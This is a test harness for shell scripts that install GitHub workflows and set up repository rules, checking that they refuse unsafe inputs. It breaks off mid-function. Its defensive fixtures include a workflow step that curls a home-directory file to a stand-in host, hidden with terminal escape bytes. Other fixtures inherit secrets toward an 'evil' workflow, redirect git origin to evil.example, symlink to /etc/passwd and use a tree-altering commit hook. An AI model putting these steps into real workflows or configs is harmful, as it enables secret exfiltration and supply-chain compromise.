// Offline harness for the real (non-dry-run) flows of the human-run scripts (W2-02, D2-night N2).
// A scenario sources a script from <root>/scripts (main does not run when sourced), replaces only
// require_host and require_reviewed_checkout, puts a fake gh and a push-intercepting git on PATH,
// and runs main with stdin as a real terminal (util-linux script), because confirm_yes refuses
// any other stdin. Scenarios take the root so flows-mutation.test.ts can run them against copies
// with one check disabled (G-03). Each scenario names the CHECK or GUARD ids it covers.
import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { expect } from "vitest";

export const ROOT = join(import.meta.dirname, "..", "..");
const FAKE = join(import.meta.dirname, "fake");
export const REAL_GIT = execFileSync("bash", ["-c", "command -v git"], { encoding: "utf8" }).trim();
export const GOOD_WF = "name: ci\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n";
const ESC = "\u001b";

export interface Env {
  dir: string;
  home: string;
}

export interface StateOpts {
  rulesets?: unknown[];
  prs?: unknown[];
  labels?: { name: string; color: string; description: string }[];
  membership?: string;
  fail?: string;
  hang?: string;
  corrupt?: string;
  workflowToken?: string;
}

export function state(o: StateOpts = {}): Env {
  const dir = mkdtempSync(join(tmpdir(), "flows-"));
  const home = join(dir, "home");
  mkdirSync(home);
  writeFileSync(join(home, ".gitconfig"), "[user]\n\tname = owner\n\temail = owner@localhost\n");
  writeFileSync(join(dir, "repo.json"), JSON.stringify({ permissions: { admin: true }, allow_auto_merge: false, allow_squash_merge: true, allow_merge_commit: true, allow_rebase_merge: true, delete_branch_on_merge: false }));
  writeFileSync(join(dir, "workflow.json"), JSON.stringify({ default_workflow_permissions: o.workflowToken ?? "write", can_approve_pull_request_reviews: true }));
  writeFileSync(join(dir, "rulesets.json"), JSON.stringify(o.rulesets ?? []));
  writeFileSync(join(dir, "labels.json"), JSON.stringify(o.labels ?? []));
  writeFileSync(join(dir, "prs.json"), JSON.stringify(o.prs ?? []));
  writeFileSync(join(dir, "log"), "");
  if (o.membership) writeFileSync(join(dir, "membership.json"), JSON.stringify({ role: o.membership }));
  if (o.fail) writeFileSync(join(dir, "fail"), o.fail);
  if (o.hang) writeFileSync(join(dir, "hang"), o.hang);
  if (o.corrupt !== undefined) writeFileSync(join(dir, "corrupt"), o.corrupt);
  return { dir, home };
}

export const git = (cwd: string, ...args: string[]) => execFileSync(REAL_GIT, args, { cwd, stdio: "pipe", encoding: "utf8", env: { PATH: process.env.PATH ?? "", HOME: cwd, GIT_CONFIG_NOSYSTEM: "1" } });

/** A bare "GitHub" repo for gh repo clone. Optionally a default branch other than main. */
export function remote(e: Env, files: Record<string, string>, links: Record<string, string> = {}, o: { devBranch?: Record<string, string>; branches?: string[] } = {}): { main: string } {
  const src = join(e.dir, "src");
  mkdirSync(src);
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(join(src, rel, ".."), { recursive: true });
    writeFileSync(join(src, rel), text);
  }
  for (const [rel, target] of Object.entries(links)) {
    mkdirSync(join(src, rel, ".."), { recursive: true });
    symlinkSync(target, join(src, rel));
  }
  const c = ["-c", "user.name=t", "-c", "user.email=t@localhost"];
  git(src, "init", "-q", "-b", "main");
  git(src, "add", "-A");
  git(src, ...c, "commit", "-q", "-m", "init");
  const main = git(src, "rev-parse", "HEAD").trim();
  for (const b of o.branches ?? []) git(src, "branch", b);
  if (o.devBranch) {
    git(src, "checkout", "-q", "-b", "dev");
    for (const [rel, text] of Object.entries(o.devBranch)) writeFileSync(join(src, rel), text);
    git(src, "add", "-A");
    git(src, ...c, "commit", "-q", "-m", "dev only");
  }
  git(e.dir, "clone", "-q", "--bare", "src", "remote.git");
  if (o.devBranch) git(join(e.dir, "remote.git"), "symbolic-ref", "HEAD", "refs/heads/dev");
  writeFileSync(join(e.dir, "remote"), join(e.dir, "remote.git"));
  return { main };
}

export interface RunResult {
  status: number | null;
  stdout: string;
  stderr: string;
  log: string;
  pushed: boolean;
  mutated: boolean;
}

/** Runs <root>/scripts/<script> main with <stdin> on a terminal (tty: true) or a pipe (tty: false). */
export function run(root: string, e: Env, script: string, args: string[], stdin: string, o: { pre?: string; tty?: boolean; env?: Record<string, string> } = {}): RunResult {
  const runner = join(e.dir, "runner.sh");
  writeFileSync(join(e.dir, "args"), args.map((a) => `${a}\0`).join(""));
  writeFileSync(
    runner,
    [
      "set -u",
      "args=()",
      'while IFS= read -r -d "" a; do args+=("$a"); done <"$FLOW_ARGS"',
      'cd "$FLOW_CWD"',
      `exec bash -c '. "$1"; shift; require_host() { :; }; require_reviewed_checkout() { :; }; eval "$FLOW_PRE"; main "$@"' harness "$FLOW_SCRIPT" "\${args[@]}" >"$FLOW_OUT" 2>"$FLOW_ERR"`,
      "",
    ].join("\n"),
  );
  const env = {
    PATH: `${FAKE}:${process.env.PATH ?? ""}`,
    HOME: e.home,
    SHELL: "/bin/bash",
    FAKE_GH_DIR: e.dir,
    FAKE_REAL_GIT: REAL_GIT,
    GIT_CONFIG_NOSYSTEM: "1",
    // Nothing in a flow test may reach the network: only local repositories are allowed.
    GIT_ALLOW_PROTOCOL: "file",
    FLOW_ARGS: join(e.dir, "args"),
    FLOW_CWD: e.dir,
    FLOW_PRE: o.pre ?? "",
    FLOW_SCRIPT: join(root, "scripts", script),
    FLOW_OUT: join(e.dir, "out"),
    FLOW_ERR: join(e.dir, "err"),
    ...o.env,
  };
  const r = o.tty === false ? spawnSync("bash", [runner], { input: stdin, encoding: "utf8", env, timeout: 60000 }) : spawnSync("script", ["-qec", `bash ${runner}`, "/dev/null"], { input: stdin, encoding: "utf8", env, timeout: 60000 });
  const read = (f: string) => (existsSync(join(e.dir, f)) ? readFileSync(join(e.dir, f), "utf8") : "");
  const log = read("log");
  return { status: r.status, stdout: read("out"), stderr: read("err"), log, pushed: /^git push/m.test(log), mutated: /(-X (PATCH|PUT|POST))|label create|^git push|pr create/m.test(log) };
}

export const json = (e: Env, f: string) => JSON.parse(readFileSync(join(e.dir, f), "utf8"));
/** Shorter timeouts for timeout scenarios: with_timeout sleeps 1 s instead of its argument. */
const FAST_TIMEOUT = `eval "$(declare -f with_timeout | sed 's/sleep "\${wt_secs}"/sleep 1/')";`;

export interface Scenario {
  name: string;
  /** CHECK or GUARD ids whose removal this scenario must notice. */
  covers: string[];
  run: (root: string) => void;
}

const install = (root: string, e: Env, stdin = "yes\n", o: { tty?: boolean; pre?: string; env?: Record<string, string> } = {}) => run(root, e, "install-workflows.sh", ["humyna-labs/resume-sg"], stdin, o);
const setup = (root: string, e: Env, args: string[] = [], stdin = "yes\n", o: { tty?: boolean; pre?: string } = {}) => run(root, e, "setup-repo.sh", ["humyna-labs/resume-sg", ...args], stdin, o);
const READ = { workflowToken: "read" };

function refusedWorkflow(name: string, wf: string, why: RegExp, covers: string[]): Scenario {
  return {
    name: `install refuses a workflow with ${name}, before printing it or pushing`,
    covers,
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/bad.yml": wf });
      const r = install(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(why);
      expect(r.pushed).toBe(false);
      expect(r.stdout).not.toContain(ESC);
      expect(r.stdout).not.toContain("Type yes");
    },
  };
}

// Verifier fixtures from /tmp/verify-W2-gap (2026-11-25), with the ESC bytes built at runtime.
const BASE = "name: x\non: push\npermissions:\n  contents: read\njobs:\n  a:\n";
export const VERIFIER_FIXTURES = {
  folded: `${BASE}    permissions:\n      contents: >-\n        write\n`,
  prt: "name: x\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm test\n",
  inherit: `${BASE}    uses: evil/x/.github/workflows/y.yml@main\n    secrets: inherit\n`,
  esc: `${BASE}    runs-on: ubuntu-24.04\n    steps:\n      - run: echo ok\n      - run: curl -d @$HOME/x https://x.example # ${ESC}[2K${ESC}[1A${ESC}[2K hidden\n`,
  readall: "name: x\non: push\npermissions: read-all\njobs: {}\n",
};

export const INSTALL_SCENARIOS: Scenario[] = [
  {
    name: "install shows the escaped change against main, pushes a fully qualified ref only after yes at the terminal, and opens the PR",
    covers: ["I3", "I6", "I7", "push-refspec"],
    run: (root) => {
      const e = state(READ);
      const { main } = remote(e, { "ci/workflows/gates.yml": GOOD_WF, "README.md": "x\n" });
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout).toContain("+permissions:");
      expect(r.stdout).toContain(`Base: humyna-labs/resume-sg main at ${main}`);
      expect(r.stdout).toContain("Type yes to continue");
      expect(r.log).toMatch(/^git push -q origin refs\/heads\/(install-workflows-\S+):refs\/heads\/\1$/m);
      expect(r.log).toContain(`parent=${main}`);
      expect(r.log).toMatch(/^pushed-file \.github\/workflows\/gates\.yml$/m);
      expect(r.log).toMatch(/^pr create -R github\.com\/humyna-labs\/resume-sg --base main /m);
      const api = r.log.split("\n").filter((l) => l.startsWith("api "));
      expect(api.length).toBeGreaterThan(0);
      for (const l of api) expect(l).toMatch(/^api --hostname github\.com /);
      expect(r.log).toMatch(/^auth status --hostname github\.com$/m);
    },
  },
  ...["no", "", "y", " yes"].map(
    (answer): Scenario => ({
      name: `install: answer ${JSON.stringify(answer)} at the terminal pushes nothing`,
      covers: [],
      run: (root) => {
        const e = state(READ);
        remote(e, { "ci/workflows/gates.yml": GOOD_WF });
        const r = install(root, e, `${answer}\n`);
        expect(r.status).toBe(1);
        expect(r.pushed).toBe(false);
        expect(r.stderr).toContain("nothing was pushed");
        expect(r.stderr).toContain("no remote changes were made");
      },
    }),
  ),
  {
    name: "install refuses yes that does not come from a terminal",
    covers: [],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      const r = install(root, e, "yes\n", { tty: false });
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/REFUSED the confirmation must come from your terminal/);
      expect(r.pushed).toBe(false);
    },
  },
  ...(
    [
      ["a workflow symlinked to a file outside the repo", {}, { "ci/workflows/hosts.yml": "/etc/hosts" }],
      ["a symlinked ci directory", {}, { ci: "/tmp" }],
      ["a symlinked destination directory", { ".github/CODEOWNERS": "* @o\n" }, { ".github/workflows": "../../outside" }],
      ["a symlink anywhere in the repo", {}, { "docs/x": "/etc/passwd" }],
    ] as const
  ).map(
    ([n, files, links]): Scenario => ({
      name: `install refuses ${n} before copying or printing anything`,
      covers: [],
      run: (root) => {
        const e = state(READ);
        remote(e, "ci" in links ? files : { "ci/workflows/gates.yml": GOOD_WF, ...files }, links);
        const r = install(root, e);
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(/REFUSED .*symlink/);
        expect(r.pushed).toBe(false);
        expect(r.stdout).not.toContain("localhost");
        expect(r.stdout).not.toContain("root:");
      },
    }),
  ),
  refusedWorkflow("no permissions block", "on: push\njobs: {}\n", /REFUSED bad\.yml has no top-level permissions/, []),
  refusedWorkflow("write-all", "on: push\npermissions: write-all\n", /REFUSED bad\.yml contains a write token/, []),
  refusedWorkflow("contents: write", "on: push\npermissions:\n  contents: write\n", /REFUSED bad\.yml contains a write token/, []),
  refusedWorkflow("a write in a block scalar (verifier fixture)", VERIFIER_FIXTURES.folded, /REFUSED bad\.yml contains a write token/, []),
  refusedWorkflow("pull_request_target (verifier fixture)", VERIFIER_FIXTURES.prt, /REFUSED bad\.yml uses .*pull_request_target/, []),
  refusedWorkflow("secrets: inherit to an external workflow (verifier fixture)", VERIFIER_FIXTURES.inherit, /REFUSED bad\.yml uses .*inherit/, []),
  refusedWorkflow("ESC bytes (verifier fixture)", VERIFIER_FIXTURES.esc, /REFUSED ci\/workflows\/bad\.yml contains 3 byte\(s\) outside printable ASCII/, []),
  refusedWorkflow("an action that is not pinned to a SHA", `${BASE}    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v4\n`, /REFUSED bad\.yml line 9: 'actions\/checkout@v4' is outside humyna-labs\/ and not pinned/, []),
  refusedWorkflow("a \\x escape that spells write", `${BASE}    permissions:\n      contents: "\\x77rite"\n`, /REFUSED bad\.yml uses a \\x, \\u or \\U escape/, []),
  {
    name: "install accepts permissions: read-all (verifier control fixture)",
    covers: [],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/r.yml": VERIFIER_FIXTURES.readall });
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.pushed).toBe(true);
    },
  },
  {
    name: "install refuses a non-workflow file and a hidden workflow file in ci/workflows",
    covers: [],
    run: (root) => {
      for (const [file, why] of [["run.sh", /REFUSED ci\/workflows\/run\.sh is not a \.yml/], [".h.yml", /REFUSED ci\/workflows\/\.h\.yml is a hidden file/]] as const) {
        const e = state(READ);
        remote(e, { "ci/workflows/gates.yml": GOOD_WF, [`ci/workflows/${file}`]: GOOD_WF });
        const r = install(root, e);
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(why);
      }
    },
  },
  ...(
    [
      ["an insteadOf rule", '[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n', /REFUSED origin fetch URL resolves to 'https:\/\/evil\.example/],
      ["a pushInsteadOf rule", '[url "https://evil.example/"]\n\tpushInsteadOf = https://github.com/\n', /REFUSED origin push URL resolves to 'https:\/\/evil\.example/],
      ["a global pushurl for origin", '[remote "origin"]\n\tpushurl = https://evil.example/x.git\n', /REFUSED origin push URL resolves to 'https:\/\/evil\.example/],
      ["a second push URL", '[remote "origin"]\n\tpushurl = https://github.com/humyna-labs/resume-sg.git\n\tpushurl = https://evil.example/x.git\n', /REFUSED origin has more than one push URL/],
    ] as const
  ).map(
    ([n, cfg, why]): Scenario => ({
      name: `install refuses when ${n} redirects origin`,
      covers: [],
      run: (root) => {
        const e = state(READ);
        remote(e, { "ci/workflows/gates.yml": GOOD_WF });
        writeFileSync(join(e.home, ".gitconfig"), `[user]\n\tname = owner\n\temail = owner@localhost\n${cfg}`);
        const r = install(root, e);
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(why);
        expect(r.pushed).toBe(false);
      },
    }),
  ),
  {
    name: "install says the branch is pushed when the pull request cannot be created",
    covers: [],
    run: (root) => {
      const e = state({ ...READ, fail: "^pr create" });
      remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      const r = install(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/Branch install-workflows-\S+ is pushed/);
      expect(r.stderr).toMatch(/gh pr create -R github\.com\/humyna-labs\/resume-sg --base main --head install-workflows-/);
      expect(r.stderr).toMatch(/remote changes already made[\s\S]*pushed branch install-workflows-/);
    },
  },
  {
    name: "install reports a push that timed out as outcome unknown",
    covers: ["M1"],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      const r = install(root, e, "yes\n", { pre: FAST_TIMEOUT, env: { FAKE_GIT_PUSH_HANG: "1" } });
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/outcome unknown, check the remote before re-running:\n {2}- pushed branch install-workflows-\S+ to humyna-labs\/resume-sg: timed out/);
      expect(r.stderr).not.toContain("no remote changes were made");
    },
  },
  {
    name: "install stops without a second branch when an install PR by you to main is open",
    covers: ["I2"],
    run: (root) => {
      const pr = { headRefName: "install-workflows-20261125-000000", baseRefName: "main", author: { login: "owner" }, headRepositoryOwner: { login: "humyna-labs" }, url: "https://github.com/humyna-labs/resume-sg/pull/9" };
      const e = state({ ...READ, prs: [pr] });
      remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout).toContain("already open: https://github.com/humyna-labs/resume-sg/pull/9");
      expect(r.log).not.toMatch(/repo clone/);
      // A PR with the same prefix by someone else, from a fork, or to another base is not yours.
      for (const other of [{ author: { login: "stranger" } }, { headRepositoryOwner: { login: "fork-owner" } }, { baseRefName: "dev" }]) {
        const e2 = state({ ...READ, prs: [{ ...pr, ...other }] });
        remote(e2, { "ci/workflows/gates.yml": GOOD_WF });
        const r2 = install(root, e2);
        expect(r2.status, r2.stderr).toBe(0);
        expect(r2.pushed).toBe(true);
      }
    },
  },
  {
    name: "install stops when an install branch exists on the remote without an open PR",
    covers: ["I4"],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": GOOD_WF }, {}, { branches: ["install-workflows-20261125-010101"] });
      const r = install(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toContain("branch install-workflows-20261125-010101 already exists");
      expect(r.pushed).toBe(false);
    },
  },
  {
    name: "install does nothing when the files are already installed",
    covers: [],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": GOOD_WF, ".github/workflows/gates.yml": GOOD_WF });
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout).toContain("nothing to do");
      expect(r.pushed).toBe(false);
    },
  },
  {
    name: "install starts from main even when the default branch is another one",
    covers: ["I3"],
    run: (root) => {
      const e = state(READ);
      const { main } = remote(e, { "ci/workflows/gates.yml": GOOD_WF }, {}, { devBranch: { "DEV-ONLY.md": "not on main\n" } });
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.log).toContain(`parent=${main}`);
      expect(r.log).not.toContain("DEV-ONLY.md");
    },
  },
  {
    name: "install takes main from a fetch of the checked URL, not from what gh happened to clone",
    covers: ["I3", "I3-fetch"],
    run: (root) => {
      const e = state(READ);
      const { main } = remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      // A decoy repository that gh clones instead (another protocol or a rewrite), with another main.
      const decoy = join(e.dir, "decoy");
      mkdirSync(decoy);
      writeFileSync(join(decoy, "DECOY.md"), "not the reviewed repo\n");
      mkdirSync(join(decoy, "ci", "workflows"), { recursive: true });
      writeFileSync(join(decoy, "ci", "workflows", "gates.yml"), GOOD_WF);
      git(decoy, "init", "-q", "-b", "main");
      git(decoy, "add", "-A");
      git(decoy, "-c", "user.name=t", "-c", "user.email=t@localhost", "commit", "-q", "-m", "decoy");
      writeFileSync(join(e.dir, "clone_from"), decoy);
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.log).toMatch(/^git fetch -q --prune origin \+refs\/heads\/main:refs\/remotes\/origin\/main /m);
      expect(r.log).toContain(`parent=${main}`);
      expect(r.log).not.toContain("DECOY.md");
    },
  },
  {
    name: "install refuses when the default workflow token is not read-only",
    covers: ["I1"],
    run: (root) => {
      const e = state({ workflowToken: "write" });
      remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      const r = install(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/default workflow token of humyna-labs\/resume-sg is 'write', not read/);
      expect(r.log).not.toMatch(/repo clone/);
    },
  },
  {
    name: "install shows the content even when .gitattributes marks workflows as binary",
    covers: ["I6"],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": GOOD_WF, ".gitattributes": "*.yml binary\n" });
      const r = install(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout).toContain("+permissions:");
      expect(r.stdout).not.toContain("Binary files");
    },
  },
  {
    name: "install refuses when the staged blob differs from the checked source (ident attribute)",
    covers: ["I5"],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": `${GOOD_WF}# $Id: abc $\n`, ".gitattributes": "*.yml ident\n" });
      const r = install(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/staged \.github\/workflows\/gates\.yml differs from the checked source/);
      expect(r.pushed).toBe(false);
    },
  },
  {
    name: "install refuses to push when a commit hook changed the reviewed tree",
    covers: ["I7"],
    run: (root) => {
      const e = state(READ);
      remote(e, { "ci/workflows/gates.yml": GOOD_WF });
      const hooks = join(e.dir, "hooks");
      mkdirSync(hooks);
      writeFileSync(join(hooks, "pre-commit"), "#!/bin/sh\necho extra >.github/workflows/extra.yml\ngit add .github/workflows/extra.yml\n");
      chmodSync(join(hooks, "pre-commit"), 0o755);
      writeFileSync(join(e.home, ".gitconfig"), `[user]\n\tname = owner\n\temail = owner@localhost\n[core]\n\thooksPath = ${hooks}\n`);
      const r = install(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/the commit's tree differs from the tree you reviewed/);
      expect(r.pushed).toBe(false);
    },
  },
];

const PREFLIGHT_READS = [/^api --hostname github\.com repos\/humyna-labs\/resume-sg --jq \.permissions\.admin$/, /actions\/permissions\/workflow --jq/, /rulesets --jq/, /^label list /];
const firstIndex = (lines: string[], re: RegExp) => lines.findIndex((l) => re.test(l) && !/-X /.test(l));

export const SETUP_SCENARIOS: Scenario[] = [
  {
    name: "setup (product) reads everything first, confirms at the terminal, applies, and reads every field back",
    covers: [],
    run: (root) => {
      const e = state();
      const r = setup(root, e);
      expect(r.status, r.stderr).toBe(0);
      const log = r.log.split("\n");
      const firstWrite = log.findIndex((l) => /-X (PATCH|PUT|POST)|label create/.test(l));
      expect(firstWrite).toBeGreaterThan(0);
      for (const re of PREFLIGHT_READS) {
        const i = firstIndex(log, re);
        expect(i, `${re} must be read before the first write`).toBeGreaterThanOrEqual(0);
        expect(i, `${re} must be read before the first write`).toBeLessThan(firstWrite);
      }
      expect(json(e, "repo.json")).toMatchObject({ allow_auto_merge: true, allow_squash_merge: true, allow_merge_commit: false, allow_rebase_merge: false, delete_branch_on_merge: true });
      expect(json(e, "workflow.json")).toMatchObject({ default_workflow_permissions: "read", can_approve_pull_request_reviews: false });
      const rs = json(e, "rulesets.json")[0];
      expect(rs.bypass_actors).toEqual([]);
      expect(rs.rules[2].parameters.required_approving_review_count).toBe(0);
      expect(rs.rules[3].parameters.strict_required_status_checks_policy).toBe(true);
      expect(json(e, "labels.json")).toContainEqual({ name: "factory:needs-human", color: "d93f0b", description: "High risk, waiting for the human" });
      expect(r.stdout).toContain("labels: name, color and description read back as expected");
      expect(r.stdout).toContain("ruleset factory-main: every field that was set reads back as expected");
    },
  },
  {
    name: "setup changes nothing without yes",
    covers: [],
    run: (root) => {
      const e = state();
      const r = setup(root, e, [], "no\n");
      expect(r.status).toBe(1);
      expect(r.mutated).toBe(false);
      expect(r.stderr).toContain("no remote changes were made");
    },
  },
  {
    name: "setup refuses yes that does not come from a terminal",
    covers: [],
    run: (root) => {
      const e = state();
      const r = setup(root, e, [], "yes\n", { tty: false });
      expect(r.status).toBe(1);
      expect(r.mutated).toBe(false);
      expect(r.stderr).toMatch(/REFUSED the confirmation must come from your terminal/);
    },
  },
  {
    name: "setup prints the existing ruleset next to the new one before replacing it",
    covers: [],
    run: (root) => {
      const e = state({ rulesets: [{ id: 5, name: "factory-main", target: "branch", enforcement: "active", bypass_actors: [], rules: [{ type: "deletion" }], marker: "OLD-RULESET" }] });
      const r = setup(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout.indexOf("EXISTING ruleset:")).toBeLessThan(r.stdout.indexOf("NEW ruleset:"));
      expect(r.stdout).toContain("OLD-RULESET");
      expect(r.log).toMatch(/-X PUT repos\/humyna-labs\/resume-sg\/rulesets\/5/);
    },
  },
  {
    name: "setup plan shows each label's current and new value and skips unchanged labels",
    covers: [],
    run: (root) => {
      const e = state({ labels: [{ name: "factory:ready", color: "0e8a16", description: "Ready for the factory queue" }, { name: "factory:tests", color: "000000", description: "old text" }] });
      const r = setup(root, e);
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout).toContain("label factory:ready: SAME");
      expect(r.stdout).toContain("label factory:tests: CHANGE color 000000 -> c5def5, description 'old text' -> 'QA is writing failing tests'");
      expect(r.stdout).toContain("label harness-fix: NEW color 5319e7");
      expect(r.stdout).toMatch(/labels: 16 new, 1 changed, 1 unchanged/);
      expect(r.log).not.toMatch(/^label create factory:ready /m);
      expect(r.log).toMatch(/^label create factory:tests /m);
    },
  },
  {
    name: "setup fails the read-back on a single wrong field and names it",
    covers: [],
    run: (root) => {
      const e = state({ corrupt: "" });
      const r = setup(root, e);
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/field enforcement: expected 'active', GitHub has 'evaluate'/);
      expect(r.stderr).toMatch(/remote changes already made[\s\S]*ruleset factory-main created/);
    },
  },
  {
    name: "setup on a failure part-way lists each change already made, label by label",
    covers: ["label-record"],
    run: (root) => {
      const e = state({ fail: "^label create factory:impl " });
      const r = setup(root, e);
      expect(r.status).toBe(1);
      const tail = r.stderr.split("remote changes already made")[1] ?? "";
      expect(tail).toContain("repo merge settings");
      expect(tail).toContain("default workflow token set to read-only");
      expect(tail).toContain("label factory:ready created or updated");
      expect(tail).toContain("label factory:tests created or updated");
      expect(tail).not.toContain("label factory:impl");
      expect(tail).not.toContain("ruleset");
    },
  },
  {
    name: "setup reports a mutation that timed out as outcome unknown, not as no change",
    covers: ["M1"],
    run: (root) => {
      const e = state({ hang: "-X PUT repos/humyna-labs/resume-sg/actions/permissions/workflow" });
      const r = setup(root, e, [], "yes\n", { pre: FAST_TIMEOUT });
      expect(r.status).toBe(1);
      expect(r.stderr).toMatch(/remote changes already made before the failure:\n {2}- repo merge settings\n/);
      expect(r.stderr).toMatch(/outcome unknown, check the remote before re-running:\n {2}- default workflow token set to read-only: timed out/);
      expect(r.stderr).not.toContain("no remote changes were made");
    },
  },
  {
    name: "setup factory profile: 1 approval, merge commits allowed, no auto-merge, checks only with the flag",
    covers: [],
    run: (root) => {
      const e = state();
      const r = run(root, e, "setup-repo.sh", ["humyna-labs/factory", "--require-checks", "factory-ci / test"], "yes\n");
      expect(r.status, r.stderr).toBe(0);
      expect(json(e, "repo.json")).toMatchObject({ allow_auto_merge: false, allow_merge_commit: true, allow_squash_merge: true });
      const rs = json(e, "rulesets.json")[0];
      expect(rs.rules[2].parameters).toMatchObject({ required_approving_review_count: 1, require_code_owner_review: true });
      expect(rs.rules[3].parameters.required_status_checks).toEqual([{ context: "factory-ci / test" }]);
    },
  },
  {
    name: "setup option (b): GitHub stores the OrganizationAdmin actor with actor_id null, and the read-back accepts it",
    covers: ["S1"],
    run: (root) => {
      const e = state({ membership: "member" });
      const r = run(root, e, "setup-repo.sh", ["humyna-labs/factory", "--owner-bypass"], "yes\n");
      expect(r.status, r.stderr).toBe(0);
      expect(r.stdout).toContain('"bypass_actors": [{"actor_id":1,"actor_type":"OrganizationAdmin","bypass_mode":"pull_request"}]');
      expect(json(e, "rulesets.json")[0].bypass_actors).toEqual([{ actor_id: null, actor_type: "OrganizationAdmin", bypass_mode: "pull_request" }]);
      expect(r.stdout).toContain("ruleset factory-main: every field that was set reads back as expected");
    },
  },
  ...(
    [
      ["bypass-mode", /field bypass_actors: expected 'OrganizationAdmin:pull_request', GitHub has 'OrganizationAdmin:always'/],
      ["bypass-id", /field bypass_actors: expected 'OrganizationAdmin:pull_request', GitHub has 'OrganizationAdmin:5:pull_request'/],
    ] as const
  ).map(
    ([corrupt, why]): Scenario => ({
      name: `setup option (b): the read-back still fails on ${corrupt}`,
      covers: ["S1", "S1-weak"],
      run: (root) => {
        const e = state({ membership: "member", corrupt });
        const r = run(root, e, "setup-repo.sh", ["humyna-labs/factory", "--owner-bypass"], "yes\n");
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(why);
      },
    }),
  ),
  ...(
    [
      ["admin", "admin"],
      ["a failed lookup", undefined],
    ] as const
  ).map(
    ([n, role]): Scenario => ({
      name: `setup option (b): refuses when the bot role is ${n}, before any change`,
      covers: [],
      run: (root) => {
        const e = state(role ? { membership: role } : {});
        const r = setup(root, e, ["--owner-bypass"]);
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(/REFUSED humyna-bot has organization role/);
        expect(r.mutated).toBe(false);
      },
    }),
  ),
  ...(
    [
      ["an option-like label name", "--repo=other/x|0e8a16|bad\n", /REFUSED labels line 1: bad name/],
      ["an ESC byte in a description", `factory:x|0e8a16|bad${ESC}[2K\n`, /REFUSED scripts\/labels\.txt contains 1 byte/],
      ["a duplicate name", "factory:x|0e8a16|one\nfactory:x|0e8a16|two\n", /REFUSED labels line 2: duplicate name/],
    ] as const
  ).map(
    ([n, text, why]): Scenario => ({
      name: `setup refuses a labels.txt with ${n} before any call`,
      covers: [],
      run: (root) => {
        const e = state();
        writeFileSync(join(e.dir, "labels.txt"), text);
        const r = setup(root, e, [], "yes\n", { pre: `LABELS_FILE="${join(e.dir, "labels.txt")}";` });
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(why);
        expect(r.log).toBe("");
      },
    }),
  ),
];

/** Copies <root>/scripts (without node_modules and tests) to <dest>/scripts. */
export function copyScripts(root: string, dest: string): void {
  mkdirSync(join(dest, "scripts"), { recursive: true });
  for (const f of ["setup-repo.sh", "install-workflows.sh", "labels.txt", "lib"]) cpSync(join(root, "scripts", f), join(dest, "scripts", f), { recursive: true });
}

/** E1: started from inside the bind mount, a script stops before sourcing a library or running git. */
export const ENTRY_SCENARIOS: Scenario[] = (["setup-repo.sh", "install-workflows.sh"] as const).flatMap((script) =>
  ["ai-projects/agent-factory", "AI-Projects/Agent-Factory"].map(
    (mount): Scenario => ({
      name: `${script} started from ~/${mount} stops before sourcing a library or running git, dry run included`,
      covers: [`E1:${script}`],
      run: (root) => {
        const dir = mkdtempSync(join(tmpdir(), "entry-"));
        const home = join(dir, "home");
        const copy = join(home, mount, "factory");
        copyScripts(root, copy);
        mkdirSync(join(home, "ai-projects", "agent-factory"), { recursive: true });
        const mark = join(dir, "sourced");
        // A library that announces it was loaded, and a git that records every call.
        writeFileSync(join(copy, "scripts", "lib", "common.sh"), `printf loaded >"${mark}"\n${readFileSync(join(copy, "scripts", "lib", "common.sh"), "utf8")}`);
